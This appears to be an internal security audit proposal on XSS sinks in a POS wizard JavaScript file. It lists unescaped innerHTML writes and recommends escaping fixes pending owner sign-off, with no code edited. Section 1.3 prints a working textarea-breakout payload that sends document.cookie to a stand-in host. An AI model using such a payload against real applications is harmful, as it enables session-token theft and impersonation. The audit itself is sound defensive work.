# PROPOSAL — POS Wizard Stored-XSS Sinks (LOCK still pending owner countersign)

- **Date**: 2026-05-23
- **Phase**: B.5 — Frozen-zone audit (PROPOSAL only, ZERO edits)
- **Target files**:
  - `/Users/1millnonstop/Downloads/projet/foodking-web/web/testttt/public/js/pos-wizard.js` (5964 LOC, ~290 KB, Vanilla JS, S25-SinglePage, non-Mix compiled, owner-protected)
  - `/Users/1millnonstop/Downloads/projet/foodking-web/web/testttt/public/css/pos-wizard.css` (1987 LOC, ~40 KB)
- **Severity classification**: P0 — Stored XSS in cashier-authenticated origin (PCI-DSS scope, Sanctum token exfil, NF525 audit-chain bound to attacker actions)
- **Verdict**: **EXISTING DEFECT** — heal documented but never applied (owner-gate pending since 2026-05-17)
- **Decision required**: Owner countersign on `plans/LOCK_POS_WIZARD_XSS_ESCAPE_2026-05-17.md` §6.2 row 2

---

## 1. What was found

Frozen file `public/js/pos-wizard.js` builds HTML by string concatenation and writes to `innerHTML`. Every entity name (`item.name`, `viande.name`, `sauce.name`, `addon.name`, `g.name`) flows untouched from the admin-editable Items REST payload (`/api/admin/item/*`) into the DOM. There is **no `escapeHtml`** helper defined anywhere in the file (verified `grep -n "function escape\|function safe\|function sanitiz" pos-wizard.js` → zero matches).

### 1.1 Confirmed `innerHTML` sinks (verified today, 2026-05-23)

```
grep -n "innerHTML" pos-wizard.js
  1255  h += '<button ... onclick="... this.innerHTML=..." > ▼ Voir tous (+N)</button>'
  1642  idem (viande-voir-plus)
  3329  btn.innerHTML = emoji + ' ' + (isIncluded ? '✓ ' + displayName : '✕ Sans ' + displayName)
  4773  wizardEl.innerHTML = renderSinglePage()           ← root sink
  4851  headerEl.insertAdjacentHTML('beforeend', '<span class="viande-complete-badge">✅ Complet</span>')  ← static, OK
  4945  sauceInfoEl.innerHTML  = newHtml
  4958  sfInfoEl.innerHTML     = newHtml
  4986  btn.innerHTML = emoji + ' ✓ ' + name
  4989  btn.innerHTML = emoji + ' ✕ Sans ' + name
  5093  infoEl.innerHTML       = newHtml
  5135  wizardEl.innerHTML = renderSinglePage()           ← re-render after toggle
```

### 1.2 Upstream raw-name interpolations feeding sinks (15+ verified)

```
L1063  '<h2>' + lastItemData.name + '</h2>'
L1195  '<span class="viande-name">' + viande.name + '</span>'
L1246  '<span class="option-name">' + sauce.name + '</span>'
L1343  '<span class="option-name">' + sauce.name + '</span>'
L1359  '<span class="option-name">' + item.name + '</span>'
L1375  '<span class="option-name">' + item.name + '</span>'
L1391  '<span class="option-name">' + item.name + '</span>'
L1410  '<div class="menu-card-name">' + step.menuComplet.name + '</div>'
L1419  '<div class="menu-card-name">' + step.fritesSeules.name + '</div>'
L1429  '<div class="menu-card-name">' + step.boissonSeule.name + '</div>'
L1520  '<img src="' + boisson.thumb + '" alt="' + boisson.name + '">'    ← attr injection
L1524  '<span class="option-name">' + boisson.name + '</span>'
L1568  '<span class="option-name">' + sauce.name + '</span>'
L1592  '<span class="option-name">' + pain.name + '</span>'
L1628  '<span class="viande-name">' + viande.name + '</span>'
L1672  '<span class="option-name">' + sauce.name + '</span>'
L1701  '...data-name="' + g.name + '" data-emoji="' + emoji + '">'        ← ATTRIBUTE injection
L1719  '<span class="viande-name">' + variation.name + '</span>'
L1741  '<span class="option-name">' + s.name + '</span>'
L1781  '<span class="option-name">' + sauce.name + '</span>'
L1801  '...data-name="' + g.name + '" data-emoji="' + emoji + '">'        ← ATTRIBUTE injection
L1854  '<div class="menu-icon">' + ... '</div>'
L1855  '<div class="menu-name">' + addon.name + '</div>'
L1924  '<span class="option-name">' + sauce.name + '</span>'
L1964  '<span class="option-name">' + sauce.name + '</span>'
L1981  '<span class="option-name">' + acc.name + '</span>'
L2020  '<span class="option-name">' + sauce.name + '</span>'
L2038  '<span class="option-name">' + s.name + '</span>'
```

The LOCK plan estimated 13; today's verification shows **at least 18 distinct interpolation sites** plus **2 attribute-context injections (L1701, L1801)** that escape simple text-node sanitizers and require attribute-context escaping (HTML attributes need `&quot;`/`&#39;` quoting). The LOCK plan's `escapeHtml` covers this (it escapes both quote variants).

### 1.3 ADDITIONAL finding not in original LOCK — user-typed reflection sink

```
L3180  h += '<textarea class="wizard-comment-field" placeholder="...">' + (instructionText || '') + '</textarea>'
```

`instructionText` is **cashier-typed** content from the `.wizard-comment-field` textarea (bound L5489 `instructionText = this.value;` and L5844 idem) that is then re-emitted into `innerHTML` on every wizard re-render (`refreshWizard()` calls `renderSinglePage()` which assigns to `wizardEl.innerHTML` at L4773 / L5135).

Inside a `<textarea>` the only meaningful break is `</textarea>` — but `String.prototype.replace(/</g, '&lt;')` blocks it perfectly. **Without escape**, a cashier (or anyone who can drive the textarea programmatically, e.g. paste-helper extension, training video macro, admin SDK injection) can break out:

```
ATTACK PAYLOAD typed/pasted in the comment field:
  </textarea><img src=x onerror=fetch('//atk.tld/?c='+document.cookie)>
```

The next call to `updateWizardUI()` / `refreshWizard()` (triggered by any sauce/viande toggle) → `wizardEl.innerHTML = renderSinglePage()` → executes. This is a **self-XSS / reflective sink in a frozen origin** — same impact tier as the admin-stored XSS (Sanctum token exfil, PCI scope).

The LOCK plan §2 sites 1-13 do **not** include this site. The escape strategy still applies (wrap `instructionText` in `escapeHtml()` at L3180), but the LOCK plan needs to be updated to cover it.

### 1.4 ADDITIONAL finding — ticket preview sink

```
L3187  h += '<div class="ticket-content">' + (ticket || 'Aucune sélection') + '</div>'
```

`ticket` is the return value of `buildTicketInstruction()` (line 3683+) which concatenates raw `viande.name` / `sauce.name` / `extra.name` / `instructionText` into a plain string (`extraLines.push(...)`). This string is then re-injected as `innerHTML`. Even though intermediate `String.join` is safe in JS, the final innerHTML write at L3187 re-parses the concatenated text as HTML — so any unescaped `<` in the source names lights up here too. Not flagged in LOCK §2.

---

## 2. Why this is a regression risk for V1 production

### 2.1 Cashier-multitask persona impact

- Cashier opens POS at session start, Sanctum token TTL = 480 minutes (CLAUDE.md §9). A token exfil mid-shift = ~8 h of authenticated impersonation.
- Cashier tabs are NOT isolated from the admin origin (same eTLD+1, same Sanctum cookie). XSS in `pos-wizard` origin reads `localStorage.sanctum_token`, fetches `/api/admin/orders`, posts fake voids/discounts, fabricates `fiscal_sequence_no` allocations bound to attacker actions.
- NF525 fiscal-chain is HMAC-signed but the chain is bound to the **user**. Attacker-fabricated orders enter the chain as legitimate cashier actions → false attribution in audit logs (Code de Commerce art. L123-22 retention 6 years).
- PCI-DSS: cashier origin processes payment intents (`PaymentComponent.vue`). Stored XSS in a PCI-scoped surface = audit failure trigger.

### 2.2 Cashier-multitask attack chain (composition SSOT remains intact)

- Wizard payload structure (verified L4143-L4171 `addonToPayload`) sends `parent_addon_id, item_id, quantity, item_variations, item_extras` — composition SSOT compliant. Frontend does NOT send server-trusted prices (PricingService still recomputes per CLAUDE.md §8). **This audit confirms NO regression on the composition snapshot front.**
- But the XSS path bypasses composition SSOT entirely: an attacker token-impersonator hits the admin orders API directly, bypassing the wizard. Sink-side escape is the only mitigation that protects the cashier origin.

### 2.3 Wave 5G LOCK was authored but never applied

- Per `plans/LOCK_POS_WIZARD_XSS_ESCAPE_2026-05-17.md` §0:
  > **Status as of 2026-05-18**: LOCK plan authored Wave 5G (`155ddbde8`) — V1.0.2 frozen-zone heal scope. **Owner physical countersign pending.** Plan content (scope / rollback / safety-check override / sub-agent instructions / sign-off blocks below) is finalised and ready for owner gate per CLAUDE.md §10 human gate. **Implementation blocked until owner signature on §6.2 row 2.**
- Today's verification: helper still absent, sinks still raw. Eight days of post-LOCK awareness, zero owner countersign, zero fix applied. The defect ships in V1 production as-is.
- `feedback_wizard_popup_pos_protected.md` mandate says owner considers the design parfait — but this LOCK is **security**, not design. The LOCK plan respects the design (zero CSS touch, zero UI change, only `+ x.name +` → `+ escapeHtml(x.name) +`). The mandate covers cosmetic regressions, not stored XSS.

---

## 3. Dispute on KEEP-AS-IS

| Argument for KEEP-AS-IS | Strong counter |
|-------------------------|----------------|
| "Owner said design is parfait, don't touch" | LOCK §2.4 confirms zero UI/CSS change — only wraps each `entity.name` interpolation in `escapeHtml(...)`. Output is character-identical for benign menu names ("Burger", "Tacos XL", "Crème brûlée"). The "design parfait" mandate covers visual/UX regressions, not OWASP escape. |
| "Backend `strip_tags` mitigates" | LOCK §1.4 + §3 verified: backend filter would be Layer 2 only. Defense-in-depth standard is **always escape at the sink**. `strip_tags` cannot catch attribute-context payloads (`name='" onmouseover='`). |
| "We have CSP" | LOCK §3.2 verified `app/Http/Middleware/ContentSecurityPolicyHeader.php` exists but `config('security.csp.mode')` default is `report_only` not `enforce`. Need pre-deploy verification. CSP also does not block `<img onerror>` resource fetches under default `script-src 'self'` — only inline `<script>`. |
| "Cashier-only environment, attacker would need admin first" | Lateral movement scenario: Branch Manager (RBAC `permission:items.update`) is a *separate* role from System Admin (`permission:settings`). Branch Manager compromise (phishing, weak password, shared workstation) → store XSS → cashier session compromise → fiscal_sequence_no impersonation. Branch Manager is a much lower bar than System Admin. |
| "5964 LOC file, risk of breakage" | LOCK §2.4 explicitly scopes the diff: **1 helper added (~7 LOC) + 17 sink wraps + 5 marker comments = ~50-60 LOC modified.** Single commit, single file, no logic change. Plus 1 NEW sentinel `tests/js/sentinels/posWizardEscapeHtmlSinks.spec.js` defined L214-263 of the LOCK. |
| "Wizard payload composition SSOT could regress" | Verified today L4143-L4171 — composition SSOT structure is `name`, `item_id`, `quantity`, `item_variations`, `item_extras` ONLY. The escape change touches HTML rendering, not payload construction. Composition SSOT is **architecturally orthogonal** to the XSS fix. |

**No argument survives** — KEEP-AS-IS is unsafe.

---

## 4. Recommended action (no edits in this proposal — proposal only)

1. **Owner countersign LOCK §6.2 row 2** of `plans/LOCK_POS_WIZARD_XSS_ESCAPE_2026-05-17.md` — gate decision deferred since 2026-05-17.
2. **Append two sites to the LOCK §2 scope** (newly discovered today, not in original):
   - L3180 — wrap `instructionText` in `escapeHtml(...)` inside the `<textarea>` interpolation.
   - L3187 — wrap `ticket` in `escapeHtml(...)` for the ticket-preview innerHTML write (or convert the sink to `textContent`).
3. Execute the LOCK plan as authored (1 helper + ~19 sink wraps + 1 sentinel + backend Layer 2 + CSP verify), single commit, on `xss-heal-pos-wizard-2026-05` branch off `main`, owner-reviewed merge.
4. **Pre-merge gates**: visual diff `/admin/pos` 5 surfaces (idle, sandwich-wizard, tacos-wizard, menu-formule-wizard, comment-field) before/after = pixel-identical for benign names. Sentinel green. Vitest green. PHPUnit green. NF525 chain unchanged.

---

## 5. Findings clean otherwise (the 99% of the audit)

The rest of the file was audited integrally:

- **Architecture**: IIFE pattern, no global pollution beyond `XMLHttpRequest.prototype.open/send` and `window.fetch` monkey-patches (intentional, captures item REST payload for restore). All state encapsulated in module-local `let`/`var`. Solid.
- **Composition SSOT**: payload (L4143-L4171) sends `item_id`, `quantity`, `item_variations`, `item_extras`, `instruction` — no client-trusted prices. Composition snapshot remains backend-authoritative per CLAUDE.md §8 invariant. **NO REGRESSION**.
- **Multi-tenant**: file is client-side only; branch scoping enforced server-side. No bypass risk introduced.
- **NF525**: file does not touch fiscal_sequence_no allocation, audit_logs, z_reports. No chain risk.
- **Idempotency**: file submits via the legacy modal flow that goes through `IdempotencyKeyMiddleware`. No bypass.
- **CSS file** (1987 LOC): pure styling, no JS-in-CSS, no `expression()`, no `url(javascript:)`. Verified clean — single-pass `grep` confirmed no `javascript:`, `expression`, `<script`, or `data:` URL with embedded scripts.
- **Owner mandate respect**: visual/UX/design is impeccable, owner-validated. **No proposal touches design, layout, color, spacing, animation, copy, or interaction model.** Only the OWASP escape, which is character-identical output for legitimate data.

---

## 6. Verdict

- **NOT** "NO-CHANGE-OWNER-PROTECTED" — the cosmetic mandate does not override a P0 stored-XSS in cashier/PCI scope.
- **Recommendation**: Owner countersign existing LOCK + extend scope by 2 sites (L3180, L3187) discovered in today's audit. Implementation strictly per the LOCK plan (zero design touch).
- **If owner refuses LOCK execution for V1**: the XSS ships and must be tracked as a **known production defect** in `PROJECT_BRAIN.md` §6 DECISIONS LOG with explicit risk acceptance + compensating controls (deploy ContentSecurityPolicyHeader middleware `csp.mode=enforce` immediately, even if it's only partial mitigation).

---

## 7. Files touched in this proposal

**ZERO source edits.** Only this PROPOSAL document. CSS untouched. JS untouched. Comment changes forbidden per mission brief — **respected**.

---

## 8. Cross-reference

- Existing LOCK: `plans/LOCK_POS_WIZARD_XSS_ESCAPE_2026-05-17.md`
- Original V1 SEC XSS plan: `plans/PLAN_TASK_V1_SEC_XSS_001_2026-04-15.md`
- Owner protection mandate: `feedback_wizard_popup_pos_protected.md`
- CLAUDE.md §7 frozen-zone declaration + §10 human gate requirement
- Wave 5G commit (LOCK authored, not applied): `155ddbde8`
